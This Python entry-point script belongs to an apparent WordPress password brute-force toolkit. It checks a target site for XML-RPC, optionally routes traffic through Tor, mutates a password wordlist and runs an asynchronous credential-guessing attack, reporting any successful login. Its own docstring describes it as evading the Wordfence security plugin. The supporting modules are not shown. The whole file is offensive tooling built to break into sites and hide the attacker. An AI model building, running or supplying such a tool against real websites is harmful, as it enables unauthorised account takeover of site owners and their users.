# wordpress_bruteforce/main.py
import asyncio
from modules.auth import BruteForce
from modules.waf import WAFDetector
from modules.xmlrpc import XMLRPCScanner
from modules.utils import print_colored_bold, validate_url, load_wordlist, Mutagen
from tqdm import tqdm


async def main():
    """Main execution flow with Wordfence evasion"""
    print_colored_bold("🚀 Starting Advanced WordPress Brute Force Toolkit", "cyan")

    target_url = input("🌐 Enter target URL (e.g., https://example.com): ")
    validate_url(target_url)

    # Initialize components
    scanner = XMLRPCScanner()
    if not await scanner.check_xmlrpc(target_url):
        print_colored_bold("❌ XML-RPC not available or blocked. Exiting...", "red")
        return

    # Configuration
    use_tor = input("🔒 Use Tor? (y/n): ").lower() == "y"
    brute_force = BruteForce(target_url, use_tor)

    # Load and mutate passwords
    passwords = load_wordlist("data/wppass.txt")
    mutated_passwords = Mutagen().mutate_passwords(passwords)

    # Start attack
    try:
        with tqdm(total=len(mutated_passwords), desc="🔥 Bruteforcing") as pbar:
            async for result in brute_force.execute_attack(mutated_passwords):
                if result:
                    print_colored_bold(f"\n🎉 Success! {result}", "green")
                pbar.update(1)
    except Exception as e:
        print_colored_bold(f"⚠️ Critical error: {str(e)}", "red")
    finally:
        await brute_force.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
